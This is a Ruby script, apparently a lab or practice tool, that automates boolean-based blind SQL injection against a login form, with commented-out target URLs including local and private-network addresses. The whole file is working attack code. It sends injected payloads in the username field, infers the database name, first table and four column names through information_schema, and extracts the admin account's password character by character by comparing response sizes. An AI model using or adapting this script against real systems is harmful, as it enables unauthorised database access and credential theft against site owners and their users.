require 'net/http'
require 'uri'

#@url 			= URI.parse("http://10.10.10.73/login.php")
@url 			= URI.parse("http://127.0.0.1:1212/bsqli.php")
#@url 			= URI.parse("http://127.0.0.1:1313/login.php")
#@url 			= URI.parse("http://192.168.1.34:81/bsqli.php")

# Response size when the query returns false
@FALSE_RESPONSE = Net::HTTP.post_form(@url,'username' => "'or 1=2 #", 'password' => 'aaa').body.size.to_i

#Database
db = { :length => 0, :name => ""}

#Tables
table = {:count => 0, :first_length => 0, :first_name => ""}

#Columns
column = {:count => 0, :length => { :first => 0,:second => 0, :third => 0, :fourth => 0}, :name => { :first => "",:second => "", :third => "", :fourth => ""} }

#Dump
admin = {:length => 0, :password => ""}


def count_characters(payload)
 end_num = end_num.to_s

 (50).times do |count|
  count = count.to_s
  format_payload = payload.sub('?',"#{count}")
  params = {'username' => format_payload, 'password' => 'gio'}
  response = Net::HTTP.post_form(@url,params ).body

  if response.size != @FALSE_RESPONSE
  	return count
  	break
  end

 end
end

def fetch_name(payload,length)
 name = ""

 ((length.to_i)+1).times do |count|

  (([*('a'..'z'), *('0'..'9')])).each do |char|

   format_payload = payload.sub('!',char).sub('?',count.to_s)

   params = {'username' => format_payload, 'password' => 'gio'}
   response = Net::HTTP.post_form(@url,params).body.size

   if response != @FALSE_RESPONSE
   	name += char
   	break
   end
  end
 end
 name
end

db[:length]			= count_characters("'  or 1=1 AND length(database()) = ? #")  #Validate the amount of characters of the database
db[:name]				= fetch_name("'  or 1=1 AND substr(database(),?,1)='!'#",db[:length]) #Validate database name

table[:count] 			= count_characters("' or 1=1 AND (SELECT COUNT(TABLE_NAME) FROM information_schema.tables WHERE table_schema = '#{db[:name]}') = ? #")
table[:first_length] 	= count_characters("' or 1=1 AND length((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = '#{db[:name]}' LIMIT 1))=? #")
table[:first_name]		= fetch_name("' or 1=1 AND substr((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = '#{db[:name]}' LIMIT 1),?,1) = '!' #",table[:first_length])

column[:count] 			= count_characters("' OR 1=1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}') = ? #")
column[:length][:first]	= count_characters("' or 1=1 AND (SELECT length(COLUMN_NAME) FROM (SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 ) as gio) = ? #")
column[:length][:second]	= count_characters("' or 1=1 AND (SELECT length(COLUMN_NAME) FROM (SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 OFFSET 1 ) as gio) = ? #")
column[:length][:third]	= count_characters("' or 1=1 AND (SELECT length(COLUMN_NAME) FROM (SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 OFFSET 2) as gio) = ? #")
column[:length][:fourth]	= count_characters("' or 1=1 AND (SELECT length(COLUMN_NAME) FROM (SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 OFFSET 3) as gio) = ? #")
column[:name][:first]	= fetch_name("' or 1=1 AND substr((SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1),?,1) = '!'#",column[:length][:first]) # First column, use 'OFFSET 1' to get the second column and 'OFFSET 2' for the third etc 
column[:name][:second]	= fetch_name("' or 1=1 AND substr((SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 OFFSET 1),?,1) = '!'#",column[:length][:second])  
column[:name][:third]	= fetch_name("' or 1=1 AND substr((SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 OFFSET 2),?,1) = '!'#",column[:length][:third])  
column[:name][:fourth]	= fetch_name("' or 1=1 AND substr((SELECT column_NAME FROM INFORMATION_SCHEMA.COLUMNS where table_schema = '#{db[:name]}' AND table_name = '#{table[:first_name]}' LIMIT 1 OFFSET 3),?,1) = '!'#",column[:length][:fourth]) 

#dump data
admin[:length]	 = count_characters("' or 1=1 AND length( (SELECT #{column[:name][:third]} FROM #{table[:first_name]} WHERE #{column[:name][:second]} = 'admin') ) = ? #")
admin[:password] = fetch_name("' or 1=1 AND substr( (SELECT #{column[:name][:third]} FROM #{table[:first_name]} WHERE #{column[:name][:second]} = 'admin'),?,1 ) = '!'#",admin[:length])

puts "Results for #{@url}\n\n"
puts "Database: #{db}"
puts "Tables: #{table}"
puts "Columns: #{column}"
puts "Password of admin: #{admin}"


